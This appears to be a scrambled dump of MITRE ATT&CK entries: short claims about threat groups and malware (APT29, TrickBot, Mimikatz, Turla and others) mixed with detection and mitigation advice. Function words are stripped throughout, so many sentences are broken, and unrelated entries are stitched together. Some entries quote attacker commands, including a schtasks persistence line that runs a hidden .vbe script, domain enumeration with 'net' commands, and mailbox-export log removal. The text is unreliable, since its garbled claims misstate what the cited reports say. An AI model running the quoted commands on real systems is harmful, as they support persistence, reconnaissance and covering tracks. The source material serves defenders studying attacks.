<code>Get-ProcessTokenGroup</code> Privesc-PowerUp module enumerate SIDs current token.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [ServHelper](https://attack.mitre.org/software/S0382) module delete infected machine.(Citation: Proofpoint TA505 Jan 2019)(Citation: Deep Instinct TA505 Apr 2019) monitoring API calls <code>CredEnumerateA</code> list credentials Windows Credential Manager.(Citation: CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager) [Chrommme](https://attack.mitre.org/software/S0667) set sleep requesting command C2.(Citation: ESET Gelsemium June 2021) Monitor extracted list ACLs settings. [KeyBoy](https://attack.mitre.org/software/S0387) Dynamic Data Exchange (DDE) protocol download remote payloads.(Citation: PWC KeyBoys Feb 2017) [APT28](https://attack.mitre.org/groups/G0007) CVE-2015-1701 access token current process privilege escalation.(Citation: FireEye Op RussianDoll) [Machete](https://attack.mitre.org/software/S0409) detects insertion devices listening WM_DEVICECHANGE window message.(Citation: ESET Machete July 2019)   [Earth Lusca](https://attack.mitre.org/groups/G1006) required users malicious file loader activate.(Citation: TrendMicro EarthLusca 2022) [UNC2452](https://attack.mitre.org/groups/G0118) <code>cmd.exe</code> execute commands remote machines.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020) [ThreatNeedle](https://attack.mitre.org/software/S0665) decrypt payload RC4, AES, one-byte XORing.(Citation: Kaspersky ThreatNeedle Feb 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors edited variable names [Impacket](https://attack.mitre.org/software/S0357) suite avoid automated detection.(Citation: FoxIT Wocao December 2019) [NDiskMonitor](https://attack.mitre.org/software/S0272) list files directories logical drives.(Citation: TrendMicro Patchwork Dec 2017) [FrameworkPOS](https://attack.mitre.org/software/S0503) enumerate exclude selected processes compromised host speed execution memory scraping.(Citation: SentinelOne FrameworkPOS September 2019) [UNC2452](https://attack.mitre.org/groups/G0118) forged SAML tokens allowed actors impersonate users bypass MFA, enabling [UNC2452](https://attack.mitre.org/groups/G0118) access enterprise cloud applications services.(Citation: 365 Defender Solorigate) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) registered domains spoof targeted organizations changing top-level domain (TLD) “.us”, “.co” “.biz”.(Citation: Google EXOTIC LILY March 2022) [StoneDrill](https://attack.mitre.org/software/S0380) looked registry default browser path.(Citation: Kaspersky StoneDrill 2017) [xCaon](https://attack.mitre.org/software/S0653) Base64 encode C2 traffic.(Citation: Checkpoint IndigoZebra July 2021) Identify critical business processes targeted adversaries isolate secure systems unauthorized access tampering. [Bundlore](https://attack.mitre.org/software/S0482) install malicious browser extensions hijack user searches.(Citation: MacKeeper Bundlore Apr 2019) Ensure IIS DLLs binaries signed correct application developers. [APT29](https://attack.mitre.org/groups/G0016) PKI keys, certificate files private encryption key Active Directory Federation Services (AD FS) container decrypt SAML signing certificates.(Citation: 365 Defender Solorigate)(Citation: Cybersecurity Advisory SVR TTP 2021) [More_eggs](https://attack.mitre.org/software/S0284) installed anti-malware programs.(Citation: Talos Cobalt July 2018) [Green Lambert](https://attack.mitre.org/software/S0690) add <code>init.d</code> <code>rc.d</code> files <code>/etc</code> folder establish persistence.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [Ragnar Locker](https://attack.mitre.org/software/S0481) sc.exe create service VirtualBox driver.(Citation: Sophos Ragnar 2020) [TrickBot](https://attack.mitre.org/software/S0266) samples ports 447 8082 C2.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: Trend Micro Totbrick Oct 2016) versions [TrickBot](https://attack.mitre.org/software/S0266) custom communication protocol sends data unencrypted port 443. (Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [APT29](https://attack.mitre.org/groups/G0016) service control manager remote disable services security monitoring products.(Citation: Deep Dive Solorigate January 2021) [ZLib](https://attack.mitre.org/software/S0086) ability discover manipulate Windows services.(Citation: Cylance Dust Storm) [Stuxnet](https://attack.mitre.org/software/S0603) reduces integrity level objects write actions.(Citation: Symantec W.32 Stuxnet Dossier) [DRATzarus](https://attack.mitre.org/software/S0694) HTTPS C2 communications.(Citation: ClearSky Lazarus Aug 2020) [Rifdoor](https://attack.mitre.org/software/S0433) executed malicious Excel Word documents macros.(Citation: Carbon Black HotCroissant April 2020) [InvisiMole](https://attack.mitre.org/software/S0260) upload files victim's machine operations.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor processes accessed search common password storage locations user credentials. Application control software restriction tools, SELinux, KSPP, grsecurity MODHARDEN, Linux kernel tuning aid restricting kernel module loading.(Citation: Kernel.org Restrict Kernel Module)(Citation: Wikibooks Grsecurity)(Citation: Kernel Protection Project)(Citation: Increasing Linux kernel integrity)(Citation: LKM loading kernel restrictions) [SideCopy](https://attack.mitre.org/groups/G1008) attempted lure victims clicking malicious embedded archive files spearphishing campaigns.(Citation: MalwareBytes SideCopy Dec 2021) (Citation: CISA EB Aug 2020) [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including LSASS Memory.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools) [Ixeshe](https://attack.mitre.org/software/S0015) list file directory information.(Citation: Trend Micro IXESHE 2012) Changing UAC settings "Always Notify" user visibility UAC elevation requested, however, option popular users constant UAC interruptions. Adversaries binaries locations executed weakness. Identify block malicious software executed path interception application control tools, Windows Defender Application Control, AppLocker, Software Restriction Policies appropriate.(Citation: SANS Application Whitelisting)(Citation: Windows Defender Application Control)(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker)(Citation: Application Lockdown)(Citation: Software Restriction ) [TA505](https://attack.mitre.org/groups/G0092) stolen domain admin accounts compromise additional hosts.(Citation: IBM TA505 April 2020) [Naid](https://attack.mitre.org/software/S0205) connects C2 infrastructure establishes backdoors custom communications protocol.(Citation: Symantec Naid June 2012)(Citation: Symantec Naid Wild June 2012) Monitor network data uncommon data flows client sending data receives server). Processes utilizing network network communication suspicious. Analyze packet contents detect communications follow expected protocol behavior port used. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. encryption protocols typical network-based C2 detection difficult reduced ability signature traffic. Prior knowledge adversary C2 infrastructure domain IP address blocking, effective long-term solution adversaries change infrastructure often. (Citation: University Birmingham C2) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors scheduled tasks execute malicious PowerShell code remote systems.(Citation: FoxIT Wocao December 2019) [TinyTurla](https://attack.mitre.org/software/S0668) upload files compromised host.(Citation: Talos TinyTurla September 2021) [Zebrocy](https://attack.mitre.org/software/S0251) cmd.exe execute commands system.(Citation: ESET Zebrocy 2019)(Citation: CISA Zebrocy Oct 2020)  [Leviathan](https://attack.mitre.org/groups/G0065) C:\Windows\Debug C:\Perflogs staging directories.(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021) [IcedID](https://attack.mitre.org/software/S0483) delivered phishing e-mails malicious attachments.(Citation: Juniper IcedID June 2020) [GreyEnergy](https://attack.mitre.org/software/S0342) modifies conditions Registry adds keys.(Citation: ESET GreyEnergy Oct 2018) [Lucifer](https://attack.mitre.org/software/S0532) attempted brute force TCP ports 135 (RPC) 1433 (MSSQL) default username list usernames    passwords.(Citation: Unit 42 Lucifer June 2020) Monitor unusual login activity unknown abnormal locations, privileged accounts (ex: Exchange administrator account). Audit images deployed environment ensure malicious components. [SQLRat](https://attack.mitre.org/software/S0390) scripts responsible deobfuscating additional scripts.(Citation: Flashpoint FIN 7 March 2019) [BADFLICK](https://attack.mitre.org/software/S0642) delayed communication actor-controlled IP address 5 minutes.(Citation: Accenture MUDCARP March 2019) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors `rundll32.exe` execute malicious installers.(Citation: ESET Operation Spalax Jan 2021) Denylist Python required. [STARWHALE](https://attack.mitre.org/software/S1037) ability collect IP address infected host.(Citation: DHS CISA AA22-055A MuddyWater February 2022) Require AppleScript signed trusted developer executed - prevent random AppleScript code executing.(Citation: applescript signing) subjects AppleScript code scrutiny .app files passing Gatekeeper. [Earth Lusca](https://attack.mitre.org/groups/G1006) compromised victims exploiting vulnerabilities public-facing servers, including Exchange Oracle GlassFish.(Citation: TrendMicro EarthLusca 2022) [QUADAGENT](https://attack.mitre.org/software/S0269) command delete Registry key scheduled task.(Citation: Unit 42 QUADAGENT July 2018) [Bumblebee](https://attack.mitre.org/software/S1039) ability bypass UAC deploy post exploitation tools elevated privileges.(Citation: Cybereason Bumblebee August 2022) Ensure proper process file permissions prevent adversaries disabling interfering security/logging services. [POWERTON](https://attack.mitre.org/software/S0371) ability dump password hashes.(Citation: FireEye APT33 Guardrail) [Kinsing](https://attack.mitre.org/software/S0599) crontab download scripts minute ensure persistence.(Citation: Aqua Kinsing April 2020) [yty](https://attack.mitre.org/software/S0248) collects screenshots victim machine.(Citation: ASERT Donot March 2018) [IcedID](https://attack.mitre.org/software/S0483) HTTPS communications C2.(Citation: Juniper IcedID June 2020) [QakBot](https://attack.mitre.org/software/S0650) change checksum hash value.(Citation: Crowdstrike Qakbot October 2020)(Citation: Cyberint Qakbot 2021) Limit permissions users user create tokens. setting defined local account only. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create token object. (Citation: Create Token) define create process level token local network service GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace process level token.(Citation: Replace Process Token)

Administrators log standard user tools administrator privileges built-in access token manipulation command <code>runas</code>.(Citation: runas) [BackConfig](https://attack.mitre.org/software/S0475) compressed decimal encoded VBS scripts.(Citation: Unit 42 BackConfig 2020) [BBSRAT](https://attack.mitre.org/software/S0127) list running processes.(Citation: Palo Alto Networks BBSRAT) [SUNSPOT](https://attack.mitre.org/software/S0562) decrypts [SUNBURST](https://attack.mitre.org/software/S0559), stored AES128-CBC encrypted blobs.(Citation: CrowdStrike SUNSPOT Implant January 2021)   [PyDCrypt](https://attack.mitre.org/software/S1032) attempted execute WMIC.(Citation: Checkpoint MosesStaff Nov 2021) Monitor network traffic suspicious/malicious behavior involving DHCP, DNS gateway parameters. Additionally, monitor network traffic rogue DHCPv6 activity. [Threat Group-3390](https://attack.mitre.org/groups/G0027) compromised Desktop installer gain access victim's environments.(Citation: Trend Micro Iron Tiger April 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) masscan search Docker API ports Kubernetes clusters.(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Unit 42 Hildegard Malware)(Citation: Cisco Talos Intelligence Group) [TeamTNT](https://attack.mitre.org/groups/G0139) malware utilizes zmap zgrab search vulnerable services cloud environments.(Citation: Palo Alto Black-T October 2020) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module gather compromrised asset, including version, name, IIS version, more.(Citation: ClearSky Lebanese Cedar Jan 2021)  [Avaddon](https://attack.mitre.org/software/S0640) encrypts victim combination AES256 RSA encryption schemes.(Citation: Arxiv Avaddon Feb 2021) [SUPERNOVA](https://attack.mitre.org/software/S0578) shell.(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: CISA Supernova Jan 2021) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors named malicious scheduled task "WinUpdate" persistence.(Citation: Talos Frankenstein June 2019) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [POWERSTATS](https://attack.mitre.org/software/S0223) established persistence scheduled task command <code>”C:\Windows\system32\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe”</code>.(Citation: ClearSky MuddyWater Nov 2018) [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors downloaded tools malware compromised host.(Citation: Mandiant UNC3890 Aug 2022) [CoinTicker](https://attack.mitre.org/software/S0369) executes Python script download stage.(Citation: CoinTicker 2019) monitoring file locations installation application software components paths applications typically load extensible components. [Sliver](https://attack.mitre.org/software/S0633) AES-GCM-256 encrypt session key C2 message exchange.(Citation: GitHub Sliver Encryption) [MailSniper](https://attack.mitre.org/software/S0413) password spraying Exchange Office 365.(Citation: GitHub MailSniper) [Silent Librarian](https://attack.mitre.org/groups/G0122) acquired domains establish credential harvesting pages, spoofing target organization level domains .TK, .ML, .GA, .CF, .GQ.(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Secureworks COBALT DICKENS August 2018)(Citation: Proofpoint TA407 September 2019)(Citation: Secureworks COBALT DICKENS September 2019)(Citation: Malwarebytes Silent Librarian October 2020) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors custom malware, including [PS1](https://attack.mitre.org/software/S0613), [CostaBricks](https://attack.mitre.org/software/S0614), [SombRAT](https://attack.mitre.org/software/S0615).(Citation: BlackBerry CostaRicto November 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) delivered spearphishing emails malicious zip file.(Citation: Prevailion DarkWatchman 2021) Monitor executed commands arguments abuse installer packages, including malicious commands triggered application installations. [Ursnif](https://attack.mitre.org/software/S0386) [Systeminfo](https://attack.mitre.org/software/S0096) gather information.(Citation: TrendMicro Ursnif Mar 2015) [Exaramel Windows](https://attack.mitre.org/software/S0343) command launch remote executes commands victim’s machine.(Citation: ESET TeleBots Oct 2018) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover remote systems local network <code>net view</code> <code>net view /DOMAIN</code> commands. [Turla](https://attack.mitre.org/groups/G0010) <code>net "Domain Computers" /domain</code>, <code>net "Domain Controllers" /domain</code>, <code>net "Exchange Servers" /domain</code> enumerate domain computers, including organization's DC Exchange Server.(Citation: Kaspersky Turla)(Citation: ESET ComRAT 2020) [Micropsia](https://attack.mitre.org/software/S0339) takes screenshots 90 calling Gdi32.BitBlt API.(Citation: Radware Micropsia July 2018) [Fox Kitten](https://attack.mitre.org/groups/G0117) accessed Registry hives ntuser.dat UserClass.dat.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) types scripting perform operations, including batch scripts.(Citation: US-CERT TA18-074A) [SMOKEDHAM](https://attack.mitre.org/software/S0649) capture screenshots victim’s desktop.(Citation: FireEye Shining Light DARKSIDE 2021)(Citation: FireEye SMOKEDHAM June 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) multiple shells gain execution.(Citation: DFIR Report APT35 ProxyShell March 2022) [UNC2452](https://attack.mitre.org/groups/G0118) removed evidence email export requests <code>Remove-MailboxExportRequest</code>.(Citation: Volexity SolarWinds) temporarily replaced legitimate utilities own, executed payload, restored original file.(Citation: FireEye SUNBURST Backdoor December 2020) Analyze contents <code>.service</code> files file ensure refer legitimate, expected executables. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [PsExec](https://attack.mitre.org/software/S0029) interact systems internal network.(Citation: FoxIT Wocao December 2019) [Machete](https://attack.mitre.org/software/S0409) searches File files interest.(Citation: ESET Machete July 2019)  creation modification systemd service unit files administrators Linux root user users superuser privileges.  [Bazar](https://attack.mitre.org/software/S0534) signed fake certificates including appearing VB CORPORATE PTY. LTD.(Citation: Cybereason Bazar July 2020) [FIN8](https://attack.mitre.org/groups/G0061) aggregates staged data network single location.(Citation: FireEye Enemy FIN8 Aug 2016) [MuddyWater](https://attack.mitre.org/groups/G0069) stored obfuscated JavaScript code image file named temp.jpg.(Citation: ClearSky MuddyWater Nov 2018) [Clop](https://attack.mitre.org/software/S0611) enumerate network shares.(Citation: Mcafee Clop Aug 2019) (Citation: Securelist APT10 March 2021) [TEXTMATE](https://attack.mitre.org/software/S0146) executes cmd.exe provide reverse adversaries.(Citation: FireEye FIN7 March 2017)(Citation: Cisco DNSMessenger March 2017) [Maze](https://attack.mitre.org/software/S0449) WMI attempt delete shadow volumes machine, connect virtual machine network domain victim organization's network.(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)  [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects drives, default browser, desktop file list, Documents, Internet history, program files, root drives. searches ICS-related software files.(Citation: Symantec Dragonfly) [KeyBoy](https://attack.mitre.org/software/S0387) PowerShell commands download execute payloads.(Citation: PWC KeyBoys Feb 2017) [Indrik Spider](https://attack.mitre.org/groups/G0119) malicious JavaScript files components attack.(Citation: Symantec WastedLocker June 2020) Monitor analyze SSL/TLS traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g. extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)).

Furthermore, monitor network traffic cloned sites homographs internationalized domain names abusing character sets (e.g. Cyrillic Latin versions trusted sites).  [APT29](https://attack.mitre.org/groups/G0016) `mshta` execute malicious scripts compromised host.(Citation: ESET T3 Threat Report 2021) [APT37](https://attack.mitre.org/groups/G0067) Ruby scripts execute payloads.(Citation: Volexity InkySquid RokRAT August 2021) [POWRUNER](https://attack.mitre.org/software/S0184) base64 encoded C2 communications.(Citation: FireEye APT34 Dec 2017) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool public UAC bypass method elevate privileges.(Citation: Nccgroup Emissary Panda 2018) [Mofang](https://attack.mitre.org/groups/G0103)'s malicious spearphishing attachments required user file receiving.(Citation: FOX-IT 2016 Mofang) [Valak](https://attack.mitre.org/software/S0476) scheduled tasks execute additional payloads gain persistence compromised host.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) [ipconfig](https://attack.mitre.org/software/S0100) display adapter configuration Windows systems, including TCP/IP, DNS, DHCP. [Kevin](https://attack.mitre.org/software/S1020) assign hard-coded fallback domains C2.(Citation: Kaspersky Lyceum October 2021) user training bring awareness raise suspicion malicious events dialog boxes (ex: Office documents prompting credentials). [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), identified persona register account control server.(Citation: McAfee Honeybee)  Monitor executed commands arguments gather attempt calculate geographical location victim host. [Lazarus Group](https://attack.mitre.org/groups/G0032) <code>schtasks</code> persistence including periodic execution remote XSL script dropped VBS payload.(Citation: ESET Lazarus Jun 2020)(Citation: Qualys LolZarus)(Citation: ESET Twitter Ida Pro Nov 2021) Monitor objects loading DLLs modules typically application.(Citation: Enigma MMC20 Jan 2017) Monitor newly executed processes adversary gain Initial Access require user interaction. includes compression applications, zip files, [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) payloads. [EVILNUM](https://attack.mitre.org/software/S0568) username victim's machine.(Citation: Prevailion EvilNum 2020) [PROMETHIUM](https://attack.mitre.org/groups/G0056) script configures knockd service firewall accept C2 connections systems sequence knock ports.(Citation: Bitdefender StrongPity June 2020) [FIN6](https://attack.mitre.org/groups/G0037) stolen payment card data remote servers POSTs.(Citation: Trend Micro FIN6 October 2019) [Poseidon Group](https://attack.mitre.org/groups/G0033) searches administrator accounts local victim machine network.(Citation: Kaspersky Poseidon Group) [Derusbi](https://attack.mitre.org/software/S0021) capable performing audio captures.(Citation: FireEye Periscope March 2018) [SodaMaster](https://attack.mitre.org/software/S0627) RC4 encrypt C2 communications.(Citation: Securelist APT10 March 2021) [RedLeaves](https://attack.mitre.org/software/S0153) encrypted C2 traffic RC4, 88888888 babybear.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Doki](https://attack.mitre.org/software/S0600) dogechain.info API generate C2 address.(Citation: Intezer Doki July 20) Limit usage local administrator accounts day-to-day operations expose potential adversaries. Limit USB devices removable media network. [MechaFlounder](https://attack.mitre.org/software/S0459) ability upload download files compromised host.(Citation: Unit 42 MechaFlounder March 2019) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors dynamic DNS domains variety providers, including No-IP, Oray, 3322.(Citation: Cylance Dust Storm)  [Kimsuky](https://attack.mitre.org/groups/G0094) HWP document stealer module default program association registry HWP documents.(Citation: Securelist Kimsuky Sept 2013) [Keydnap](https://attack.mitre.org/software/S0276) space false .jpg extension execution Terminal.app program.(Citation: synack 2016 review) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s plainpwd tool modified version [Mimikatz](https://attack.mitre.org/software/S0002) dumps Windows credentials memory.(Citation: ESET Telebots Dec 2016)(Citation: ESET Telebots June 2017)	 technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Leviathan](https://attack.mitre.org/groups/G0065) spearphishing attachments attempting user click.(Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021) [Empire](https://attack.mitre.org/software/S0363) modules extract passwords common browsers Firefox Chrome.(Citation: Github PowerShell Empire) [HIDEDRV](https://attack.mitre.org/software/S0135) injects DLL [Downdelph](https://attack.mitre.org/software/S0134) explorer.exe process.(Citation: ESET Sednit 3) [GoldFinder](https://attack.mitre.org/software/S0597) logged stored route hops packet compromised machine hardcoded C2 server, including target C2 URL, response/status code, response headers values, data received C2 node.(Citation: MSTIC NOBELIUM Mar 2021)   [Regin](https://attack.mitre.org/software/S0019) malware platform Windows admin shares laterally.(Citation: Kaspersky Regin) (Citation: FireEye APT41 Aug 2019) [Threat Group-3390](https://attack.mitre.org/groups/G0027) command compile archive file types victim user's directories.(Citation: SecureWorks BRONZE UNION June 2017) (Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [RunningRAT](https://attack.mitre.org/software/S0253) code compress files.(Citation: McAfee Gold Dragon) [Valak](https://attack.mitre.org/software/S0476) ability decode decrypt downloaded files.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020) [Netwalker](https://attack.mitre.org/software/S0457) encrypt files infected machines extort victims.(Citation: TrendMicro Netwalker 2020)	 [BUBBLEWRAP](https://attack.mitre.org/software/S0043) communicate SOCKS.(Citation: FireEye admin@338) [Empire](https://attack.mitre.org/software/S0363) enumerate antivirus software target.(Citation: Github PowerShell Empire) [Carbon](https://attack.mitre.org/software/S0335) command inject code process.(Citation: ESET Carbon Mar 2017) Monitor file systems moving, renaming, replacing, modifying dylibs. set dylibs loaded process (compared behavior) correlate software, patches, etc., suspicious. Check multiple dylibs monitor versions historically loaded process. [TajMahal](https://attack.mitre.org/software/S0467) ability steal session cookies Internet Explorer, Navigator, FireFox RealNetworks applications.(Citation: Kaspersky TajMahal April 2019) (Citation: ESET Turla Mosquito 2018)(Citation: Symantec Waterbug Jun 2019) [Flagpro](https://attack.mitre.org/software/S0696) execute <code>ipconfig /all</code> command victim system.(Citation: NTT Security Flagpro December 2021) [TEMP.Veles](https://attack.mitre.org/groups/G0088) renamed files legitimate files, Windows update files Schneider Electric application files.(Citation: FireEye TRITON 2019)
 [Wizard Spider](https://attack.mitre.org/groups/G0102) lured victims clicking malicious link delivered spearphishing.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020) Ensure proper permissions set Registry hives prevent users modifying SIP trust provider components. Components hijacked suitable functions disk malicious modifications Registry prevented.  [Conficker](https://attack.mitre.org/software/S0608) obfuscated code prevent removal host machines.(Citation: Trend Micro Conficker) (Citation: TrendMicro POWERSTATS V3 June 2019) [XAgentOSX](https://attack.mitre.org/software/S0161) getFirefoxPassword function attempt locate Firefox passwords.(Citation: XAgentOSX 2017) [NavRAT](https://attack.mitre.org/software/S0247) <code>tasklist /v</code> check running processes.(Citation: Talos NavRAT 2018) Monitor file access removable media attempt exfiltrate data USB connected physical device. [Zox](https://attack.mitre.org/software/S0672) ability leverage local remote exploits escalate privileges.(Citation: Novetta-Axiom) [Rising Sun](https://attack.mitre.org/software/S0448) connection network IP address port number.(Citation: McAfee Sharpshooter December 2018) user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. [Kimsuky](https://attack.mitre.org/groups/G0094) emails Word, Excel HWP (Hangul Word Processor) documents spearphishing campaigns.(Citation: Zdnet Kimsuky Dec 2018)(Citation: Securelist Kimsuky Sept 2013)(Citation: ThreatConnect Kimsuky September 2020)(Citation: VirusBulletin Kimsuky October 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) [Axiom](https://attack.mitre.org/groups/G0001) actors Sticky replacement RDP sessions persistence.(Citation: Novetta-Axiom) [DarkComet](https://attack.mitre.org/software/S0334) listen victims' conversations system’s microphone.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [Derusbi](https://attack.mitre.org/software/S0021) capable obtaining directory, file, drive listings.(Citation: Fidelis Turbo)(Citation: FireEye Periscope March 2018)  [Siloscape](https://attack.mitre.org/software/S0623) searches Kubernetes config file files regular expression.(Citation: Unit 42 Siloscape Jun 2021)  [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), additional payloads downloaded target infected first-stage downloader.(Citation: McAfee Sharpshooter December 2018) [Darkhotel](https://attack.mitre.org/groups/G0012) collected IP address network adapter victim’s machine.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [FIN7](https://attack.mitre.org/groups/G0046) registered look-alike domains phishing campaigns.(Citation: eSentire FIN7 July 2021) (Citation: F-Secure Dukes)(Citation: ESET Dukes October 2019) [APT3](https://attack.mitre.org/groups/G0022) PowerShell victim systems download payloads exploitation.(Citation: FireEye Operation Double Tap) Monitor account activity attempts create share data, snapshots backups, untrusted unusual accounts. (Citation: CrowdStrike AQUATIC PANDA December 2021) [Gelsemium](https://attack.mitre.org/software/S0666) token manipulation bypass UAC Windows7 systems.(Citation: ESET Gelsemium June 2021) [QuasarRAT](https://attack.mitre.org/software/S0262) communicate reverse proxy SOCKS5.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office VBA macros calling Win32 APIs. (Citation: win10_asr) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) source tools operations, including JsonCPP Psiphon.(Citation: Kaspersky Ferocious Kitten Jun 2021) Enforce principle least-privilege limiting dashboard visibility resources required. limit discovery dashboard event compromised account. (Citation: MalwareBytes LazyScripter Feb 2021) [HEXANE](https://attack.mitre.org/groups/G1001) `whoami` compromised machines identify current user.(Citation: Kaspersky Lyceum October 2021) [Tonto Team](https://attack.mitre.org/groups/G0131) relied user interaction malicious RTF documents.(Citation: TrendMicro Tonto Team October 2020)(Citation: Talos Bisonal Mar 2020)  [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors staged tools infrastructure download compromised system.(Citation: Mandiant UNC3890 Aug 2022) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create Launch Daemons. Routinely check user permissions ensure expected users capability delete instances. (Citation: ThreatConnect Anthem) [GrimAgent](https://attack.mitre.org/software/S0632) delete created tasks compromised host.(Citation: IB GrimAgent July 2021) (Citation: FireEye APT28)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Turla](https://attack.mitre.org/groups/G0010) malware compromising threat actors, [OilRig](https://attack.mitre.org/groups/G0049).(Citation: NSA NCSC Turla OilRig)(Citation: Recorded Future Turla Infra 2020) [APT39](https://attack.mitre.org/groups/G0087) tools ability search files compromised host.(Citation: FBI FLASH APT39 September 2020) Avoid PowerShell profiles needed. -No Profile flag executing PowerShell scripts remotely prevent local profiles scripts executed. [POLONIUM](https://attack.mitre.org/groups/G1005) created legitimate OneDrive accounts operations.(Citation: POLONIUM June 2022) [GuLoader](https://attack.mitre.org/software/S0561) relied users clicking links malicious documents.(Citation: Unit 42 NETWIRE April 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) gather list processes running victim's machine.(Citation: Talos Kimsuky Nov 2021) store credentials Registry. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) [schtasks](https://attack.mitre.org/software/S0111) register scheduled task execute malware lateral movement.(Citation: Secureworks BRONZE BUTLER Oct 2017) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) executed base64 encoded PowerShell scripts compromised hosts.(Citation: Tetra Defense Sodinokibi March 2020) [BlackMould](https://attack.mitre.org/software/S0564) ability download files victim's machine.(Citation: GALLIUM December 2019) [Machete](https://attack.mitre.org/groups/G0095) relied users malicious links delivered spearphishing execute malware.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019) [Zeus Panda](https://attack.mitre.org/software/S0330) command delete file. uninstall scripts delete files cover track.(Citation: GDATA Zeus Panda June 2017) Disable execution directories webroot. Ensure proper permissions directories accessible server. [Lizar](https://attack.mitre.org/software/S0681) module collect usernames passwords stored browsers.(Citation: BiZone Lizar 2021) [FIVEHANDS](https://attack.mitre.org/software/S0618) payload encrypted AES-128.(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021)(Citation: NCC Fivehands June 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) social media platforms, including LinkedIn Twitter, send spearphishing messages.(Citation: Google TAG Lazarus Jan 2021)(Citation: ClearSky Lazarus Aug 2020)(Citation: ESET Lazarus Jun 2020) [Goopy](https://attack.mitre.org/software/S0477) ability delete emails C2 content copied.(Citation: Cybereason Cobalt Kitty 2017) (Citation: FireEye APT37 Feb 2018) [Reg](https://attack.mitre.org/software/S0075) interact modify Windows Registry local remote command-line 